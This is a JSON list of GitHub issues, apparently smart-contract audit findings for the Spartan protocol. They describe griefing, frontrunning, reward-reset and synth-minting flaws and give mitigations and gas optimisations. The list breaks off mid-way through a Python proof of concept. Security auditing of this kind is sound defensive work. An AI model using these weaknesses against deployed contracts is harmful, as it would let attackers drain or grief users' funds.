[{"title": "Attackers can grief voting by removing votes just before finalization", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/105", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "Attackers can grief voting by removing votes just before finalization"}, {"title": "Event log poisoning by griefing attackers", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/104", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  Event log poisoning is possible by griefing attackers who have no DAO weight but vote and emit event that takes up event log space.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L382  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L393   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Emit event only if non-zero weight as relevant to proposal voting/cancelling.  "}, {"title": "Deflationary assets are not handled uniformly across the protocol", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/101", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  The DAO codebase not handle deflationary asset tokens. However, this is handled in similar _handleTransferIn functions of Router and poolFactory which indicates that protocol allows/anticipates listing of deflationary tokens which require a start balance check/subtraction before and after transfers to account for the actual amount transferred instead of taking the face-value amount from the parameter without considering any transfer fees imposed by the token contract.  Rationale for Medium severity: This is typically a low-severity finding in protocols that uniformly do not handle deflationary/inflationary/rebasing tokens because they either whitelist-away such tokens or do not anticipate handling them (by documenting and warning users) in their protocols. Spartan however has code indicative of expecting/handling deflationary tokens in Router and poolFactory but is missing similar special handling in DAO which is a case of missed handling and so is more serious because it leads to mis-accounting and potential fund loss in different parts of the protocol code.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L266  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L206-L208  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L111-L113  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add code similar to Router and poolFactory to handle deflationary tokens in DAO.  "}, {"title": "Max approvals are risky", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/100", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "Max approvals are risky"}, {"title": "Unused membership logic", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/99", "labels": ["bug", "invalid", "1 (Low Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "Unused membership logic"}, {"title": "Address confusion causes incorrect accounting of user\u2019s harvest rewards", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/97", "labels": ["bug", "invalid", "2 (Med Risk)", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "Address confusion causes incorrect accounting of user\u2019s harvest rewards"}, {"title": "Purging DAO deployer immediately in a single-step is risky", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/96", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "Purging DAO deployer immediately in a single-step is risky"}, {"title": "Type mismatch between parameters of setGenesisFactors() and state variables", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/95", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "disagree with severity"], "target": "2021-07-spartan-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  The state variables corresponding to setGenesisFactors() parameters _coolOff, _daysToEarn, _majorityFactor, _daoClaim and_daoFee are declared to be uint256 but are set using these parameters that are uint32. While it\u2019s unlikely that these will need values > uint32, this leads to wastage of storage slots and gas.   ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L128  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L21-L24  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L19   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  The state variables can be declared uint32 to fit all five of them in a single slot and this will lead to efficient SSTOREs because they are set together. If values > uint32 are relevant, then the parameter types of setter setGenesisFactors() have to be changed.  "}, {"title": "Missing event emit for MemberWithdraws", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/94", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed", "disagree with severity"], "target": "2021-07-spartan-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  The DAO member withdrawal is missing an emit for MemberWithdraws event. This results in lack of transparency and off-chain monitoring capability.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L78  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L170-L174   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add an emit for the event or otherwise rationalize/document why it isn\u2019t necessary and remove the event declaration.  "}, {"title": "Missing zero-address checks in constructors and setters", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/93", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "Missing zero-address checks in constructors and setters"}, {"title": "Critical protocol parameter changes should have sanity/threshold checks", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/91", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "Critical protocol parameter changes should have sanity/threshold checks"}, {"title": "Critical protocol parameter changes should emit events", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/90", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "Critical protocol parameter changes should emit events"}, {"title": "ROUTER._handleTransferIn()", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/87", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  natus   # Vulnerability details  ## Impact Here we return a value that isnt used anywhere which can safely be removed. This will save the return and also memory store gas costs  If the asset is not BNB/WBNB; we also get the startBal which is another memory store that isnt required, but more importantly we do a more expensive call to check the balance of the token in the pool contract which isnt required. This goes a step further at the 'actual' step at the end where we call the balance again and then do a MINUS math operation calling the memory value  Removing those lines will make all transactions cheaper that involve moving assets through the ROUTER, which appears to be quite a lot and sometimes even multiple times per function   ## Proof of Concept     ROUTER lines #197 to #211  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L197        ## Recommended Mitigation Steps     Remove these lines: #204 #206 #208  Also remove the return: returns(uint256 actual)  "}, {"title": "ROUTER.addTradeFee()", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/86", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  natus   # Vulnerability details  ## Impact     This is called with every dividend-generating txn (which is 100 or so txns per day/era by default and can be cranked up with an increase in txn volume, so higher importance than some of the other gas opts)       This is a little harder to optimize as it uses the changed state within the same function; however there is still room for optimization despite that; see below.   arrayFeeSize is called from storage twice every time; and if the array is fully built it's also called another 20 times (by default; can be increased by dao) per call to this function. As this variable doesn't change within this function; it can simply be called once at the started and stored in memory, should be a decent gas opt in a very commonly occuring txn  feeArray is also called from storage only once whilst the array is still building and not complete (this is okay) but once it's built it's called 20 times (again; by default; this might be raised) If we instead call this from storage once *just before* it's required in the loop (has to be after addFee() as this changes that feeArray's state) we can save even more gas  also; arrayFeeLength does not need to be stored in memory; just use feeArray.length from torage instead (only used once, so will only save the memory storage gas which is small)      ## Proof of Concept    ROUTER lines #285 to #297 https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L285      ## Recommended Mitigation Steps    Step1: add at the start of the function: uint _arrayFeeSize = arrayFeeSize (Get storage arrayFeeSize & store in memory)  Step2: Replace all 3 instances of arrayFeeSize with _arrayFeeSize  Step3: add below addFee(_fee): uint [] memory _feeArray = feeArray (Get storage feeArray & store in memory)  Step4: replace feeArray[i] (inside the loop) to _feeArray[i]  Step5: remove line: uint arrayFeeLength = feeArray.length and replace arrayFeeLength with feeArray.length; no need to store in memory if its only used once  "}, {"title": "Frontrunning is infinitely profitable, slippage is implied 100%", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/85", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "disagree with severity"], "target": "2021-07-spartan-findings", "body": "# Handle  tensors   # Vulnerability details  ## Impact There are no minimum amounts out, or checks that frontrunning/slippage is sufficiently mitigated. This means that anyone with enough capital can force arbitrarily large slippage by sandwiching transactions, close to 100%.   ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L284  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L296  ## Recommended Mitigation Steps Add a minimum amount out parameter. The function reverts if the minimum amount isn't obtained.  "}, {"title": "SYNTHVAULT.addFee() Gas Optimization", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/83", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  natus   # Vulnerability details  ## Impact    This function calls revenueArray from storage when setting 'n' and then twice every loop (revenueArray[i] && revenueArray[i - 1]) and then again after the loop once.       If this was instead called once at the start and stored in memory; iterated and then assigned into the storage at the end; could save some gas       ## Proof of Concept   SYNTHVAULT lines #249 to #255     https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L249       ## Recommended Mitigation Steps   Step1: Above line #249; add in:   uint [] memory _revArray = revenueArray  (Get the storage revenueArray and store it in memory)      Step2: change revenueArray.length to _revArray.length  (maybe even remove this memory variable and just call the length directly in the loop conditions in place of 'n'?)     Step3: change:   revenueArray[i] = revenueArray[i - 1]   to:   _revArray[i] = _revArray[i - 1]      Step4: change:   revenueArray[0] = _fee   To:   _revArray[0] = _fee      Step5: add:   revenueArray = _revArray  as the final line inside the function  "}, {"title": "SYNTHVAULT.harvestAll() Gas Optimization", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/82", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  natus   # Vulnerability details  ## Impact    Here we call the storage stakedSynthAssets 3 times in the loop or 4 times per loop if the reward is > 0.   It could instead be called once before the loop and stored in memory. Will save more gas as time goes on and the stakedSynthAssets array potentially gets larger as more assets get listed      ## Proof of Concept   SYNTHVAULT lines #121 to #132   https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L121      ## Recommended Mitigation Steps   Step1: Above line #122; add in:   address [] memory _stakedSynthAssets = stakedSynthAssets  (Get the storage stakedSynthAssets and store it in memory)     Then: replace all 4 instances of:  stakedSynthAssets with _stakedSynthAssets  "}, {"title": "POOL.addFee() Gas Optimization", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/81", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  natus   # Vulnerability details  ## Impact   This function calls revenueArray from storage when setting 'n' and then twice every loop (revenueArray[i] && revenueArray[i - 1]) and then again after the loop once.     If this was instead called once at the start and stored in memory; iterated and then assigned into the storage at the end; could save some gas     ## Proof of Concept  POOL lines #357 to #363   https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L357     ## Recommended Mitigation Steps  Step1: Above line #358; add in:  uint [] memory _revArray = revenueArray (Get the storage revenueArray and store it in memory)    Step2: change revenueArray.length to _revArray.length    Step3: change:  revenueArray[i] = revenueArray[i - 1]  to:  _revArray[i] = _revArray[i - 1]    Step4: change:  revenueArray[0] = _fee  To:  _revArray[0] = _fee    Step5: add:  revenueArray = _revArray as the final line inside the function  "}, {"title": "ROUTER.addFee() Gas Optimization", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/80", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  natus   # Vulnerability details  ## Impact  This function calls feeArray from storage when setting 'n' and then twice every loop (feeArray[i] && feeArray[i - 1]) and then again after the loop once.   If this was instead called once at the start and stored in memory; iterated and then assigned into the storage at the end; could save some gas   ## Proof of Concept UTILS lines #300 to #306  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L301    ## Recommended Mitigation Steps Step1: Above line #301; add in: uint [] memory _feeArray = feeArray (Get the storage feeArray and store it in memory)  Step2: change feeArray.length to _feeArray.length  Step3: change: feeArray[i] = feeArray[i - 1] to: _feeArray[i] = _feeArray[i - 1]  Step4: change: feeArray[0] = _fee To: _feeArray[0] = _fee  Step5: add: feeArray = _feeArray  as the final line inside the function  "}, {"title": "Pool decimals are always assumed to be 18", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/79", "labels": ["bug", "invalid", "2 (Med Risk)", "sponsor disputed"], "target": "2021-07-spartan-findings", "body": "Pool decimals are always assumed to be 18"}, {"title": "Inconsistency in Function Naming", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/75", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "Inconsistency in Function Naming"}, {"title": "Use unchecked blocks in some cases to save gas.", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/74", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hrkrshnn   # Vulnerability details  ## Use unchecked blocks when safemath is not required  In some cases, it's unnecessary to use the default checked arithmetic. In such cases, wrapping the block in unchecked would save gas.  One example is:  ``` diff @@ -271,11 +272,13 @@ contract Pool is iBEP20 {       // Check the TOKEN amount received by this Pool      function _getAddedTokenAmount() internal view returns(uint256 _actual){ -        uint _tokenBalance = iBEP20(TOKEN).balanceOf(address(this)); -        if(_tokenBalance > tokenAmount){ -            _actual = _tokenBalance-(tokenAmount); -        } else { -            _actual = 0; +        uint _tokenBalance = iBEP20(TOKEN).balanceOf(address(this)); +       unchecked { +            if(_tokenBalance > tokenAmount){ +                _actual = _tokenBalance-(tokenAmount); +            } else { +                _actual = 0; +            }  ```  For loops, such optimizations would save a lot of gas.  ``` diff @@ -356,9 +359,11 @@ contract Pool is iBEP20 {       function addFee(uint _rev) internal {          uint _n = revenueArray.length; // 2 +       require(_n > 0); +       unchecked {          for (uint i = _n - 1; i > 0; i--) {              revenueArray[i] = revenueArray[i - 1];          } +       }          revenueArray[0] = _rev;      }  } ```   "}, {"title": "Variables that can be  converted into immutable", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/73", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hrkrshnn   # Vulnerability details  ## Variables that can be converted into immutable  ``` txt Warning: Variable declaration can be converted into an immutable.   --> contracts/BondVault.sol:12:5:    | 12 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Dao.sol:16:5:    | 16 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Dao.sol:18:5:    | 18 |     uint256 public secondsPerEra;   // Amount of seconds per era (Inherited from BASE contract; intended to be ~1 day)    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/DaoVault.sol:12:5:    | 12 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/DaoVault.sol:13:5:    | 13 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:14:5:    | 14 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:15:5:    | 15 |     address public TOKEN;    |     ^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:16:5:    | 16 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:19:5:    | 19 |     uint8 public override decimals; uint256 public override totalSupply;    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:27:5:    | 27 |     uint public genesis; // Timestamp from when the pool was first deployed (For UI)    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/Router.sol:9:5:   | 9 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Router.sol:10:5:    | 10 |     address public WBNB;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Router.sol:11:5:    | 11 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/Synth.sol:7:5:   | 7 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/Synth.sol:8:5:   | 8 |     address public LayerONE; // Underlying relevant layer1 token   |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/Synth.sol:9:5:   | 9 |     uint public genesis;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Synth.sol:10:5:    | 10 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Synth.sol:13:5:    | 13 |     uint8 public override decimals; uint256 public override totalSupply;    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Utils.sol:10:5:    | 10 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Utils.sol:11:5:    | 11 |     uint public one = 10**18;    |     ^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/FallenSpartans.sol:10:5:    | 10 |     address public SPARTA;    |     ^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/FallenSpartans.sol:11:5:    | 11 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/FallenSpartans.sol:12:5:    | 12 |     uint256 public genesis;    |     ^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/outside-scope/Reserve.sol:8:5:   | 8 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/Sparta.sol:30:5:    | 30 |     uint256 private _100m;    |     ^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/Sparta.sol:31:5:    | 31 |     uint256 public maxSupply;    |     ^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/Sparta.sol:38:5:    | 38 |     address public BASEv1;    |     ^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/poolFactory.sol:7:5:   | 7 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/poolFactory.sol:8:5:   | 8 |     address public WBNB;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/poolFactory.sol:10:5:    | 10 |     uint public curatedPoolSize;    // Max amount of pools that can be curated status    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/synthFactory.sol:6:5:   | 6 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/synthFactory.sol:7:5:   | 7 |     address public WBNB;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/synthVault.sol:14:5:    | 14 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/synthVault.sol:15:5:    | 15 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/synthVault.sol:23:5:    | 23 |     uint public genesis;                // Timestamp from when the synth was first deployed (For UI)    |     ^^^^^^^^^^^^^^^^^^^  ```   Instead of using an expensive `sload` operation, converting to immutable would make reading to cost just 3 gas.   ## Tools Used  A custom compiler.  "}, {"title": "wrong `calcLiquidityHoldings` that leads to dead fund in the Pool", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/71", "labels": ["bug", "3 (High Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "wrong `calcLiquidityHoldings` that leads to dead fund in the Pool"}, {"title": "Inconsistent value of burnSynth between Pool and Synth", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/70", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  jonah1005   # Vulnerability details  ## Impact When users try to born synth, the fee and the value of Sparta is calculated at contract `Pool` while the logic of burning `Pool`s Lp and Synth is located at `Synth` contract.  Users can send synth to the `Synth` contract directly and trigger `burnSynth` at the `Pool` contract. The Pool would not send any token out while the `Synth` contract would burn the lp and Synth. While users can not drain the liquidity by doing this, breaking the AMM rate unexpectedly is may lead to troubles.  The calculation of debt and the fee would end up with a wrong answer.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L245  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L174  ## Tools Used None  ## Recommended Mitigation Steps  Pool's `burnSynth` and Synth's `burnSynth` are tightly coupled functions. In fact, according to the current logic, `Synth:burnSynth` should only be triggered from a valid `Pool` contract.  IMHO, applying the`Money in - Money Out` model in the `Synth` contract does more harm than good to the readability and security of the protocol. Consider to let `Pool` contract pass the parameters to the `Synth` contract and add a require check in the `Synth` contract.    "}, {"title": "Dao.sol: Unused hasMinority()", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/69", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  `hasMinority()` is defined as a public function, but is unused in the contract. It can either be entirely removed or have its visibility changed to `external`.  "}, {"title": "removeForMember can be called by anyone, allowing for griefing", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/68", "labels": ["bug", "invalid", "2 (Med Risk)", "sponsor disputed"], "target": "2021-07-spartan-findings", "body": "removeForMember can be called by anyone, allowing for griefing"}, {"title": "_deposit resetting user rewards can be used to grief them and make them loose rewards via `depositForMember `", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/66", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  GalloDaSballo   # Vulnerability details  ## Impact The function `_deposit` sets `mapMemberSynth_lastTime` to a date in the future https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L107   `mapMemberSynth_lastTime` is also used to calculate rewards earned  `depositForMember` allows anyone, to \"make a donation\" for the member and cause that member to loose all their accrued rewards  This can't be used for personal gain, but can be used to bring misery to others.   ## Proof of Concept `depositForMember` https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L95 and can be called by anyone  This will set the member  ```  mapMemberSynth_lastTime[_member][_synth] = block.timestamp + minimumDepositTime; // Record deposit time (scope: member -> synth) ```  this can be continuously exploited to make members never earn any reward   ## Recommended Mitigation Steps  This is the second submission under the same exploit This can be mitigated by harvesting for the user right before changing `mapMemberSynth_lastTime[_member][_synth]`  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L107  "}, {"title": "Calling synthVault:_deposit multiple times, will make you loose rewards", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/65", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "Calling synthVault:_deposit multiple times, will make you loose rewards"}, {"title": "Remove _token from addLiquiditySingleForMember", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/64", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  natus   # Vulnerability details  ## Impact  Gas optimization / non-critical issue. Wasted lines of code creating and setting a local variable that does not appear to be required. I can't think of a reason to leave it in.    ## Proof of Concept _token local variable is not used anywhere in the codebase. Can be removed to save gas and compile size. Looks like it's to handle WBNB (if it was required) but forgot to check/remove after it was catered for elsewhere. - https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L83    ## Tools Used N/A    ## Recommended Mitigation Steps ROUTER.addLiquiditySingleForMember() - Remove line #82 - Remove line #83  "}, {"title": "Utils.sol: Redundant two assignment in calcLiquidityUnitsAsym()", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/63", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  The `calcLiquidityUnitsAsym()` function's last 2 lines are:  ```jsx uint two = 2; return (totalSupply * amount) / (two * (amount + baseAmount)); ```  The `two` assignment seems unnecessary.  ### Recommended Mitigation Steps  `return (totalSupply * amount) / (two * (amount + baseAmount));`  "}, {"title": "Utils.sol: Calculation issue with Slippage Adjustment", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/62", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "Utils.sol: Calculation issue with Slippage Adjustment"}, {"title": "Dao.sol: newParamProposal takes in uint32 param", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/61", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  `newParamProposal()` takes in a `uint32 param` as an input argument. The valid scenarios for this proposal are for changing the cooloff period and erasToEarn via the `changeCooloff()` and `changeEras()`. These functions however cast the `param` to `uint256` before assigning it to the relevant variable.   We therefore have either of the following cases:  1.  `uint32 param` should be increased to `uint256 param` 2. `coolOffPeriod` and `erasToEarn` can be decreased in size to `uint32` instead of `uint256`. For further optimizations, these 2 variables should be grouped together so that they take up 1 storage slot instead of 2 separate ones.  "}, {"title": "Dao.sol: Define BASE as iBEP20 instead of address", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/60", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  `BASE` is defined as an `address` type, but is casted as `iBEP20` in almost every instance within the Dao contract, and in numerous instances in many other contracts as well. It would therefore be better to define it as `iBEP20` instead, to avoid casting.  ### Recommended Mitigation Steps  Change `address public BASE;` to `iBEP public BASE`. Castings of `BASE` to `iBEP20` can be removed subsequently.  "}, {"title": "Misuse of AMM model on minting Synth (resubmit to add more detail)", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/59", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  jonah1005   # Vulnerability details  ## Impact `Pool` calculates the amount to be minted based on `token_amount` and `sparta_amount` of the Pool. However, since `token_amount` in the pool would not decrease when users mint Synth, it's always cheaper to mint synth than swap the tokens.  The synthetics would be really hard to be on peg. Or, there would be a flash-loan attacker to win all the arbitrage space.  ## Proof of Concept Pool's mint synth https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242  The synth amount is calculated at L:232 ``` uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount); ``` which is the same as swapping base to token at L:287 ``` uint256 _X = baseAmount; uint256 _Y = tokenAmount; _y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc TOKEN output ```  However, while swapping tokens decrease pool's token, mint just mint it out of the air.  Here's a POC: Swap sparta to token for ten times ```python for i in range(10):     amount = 10 * 10**18     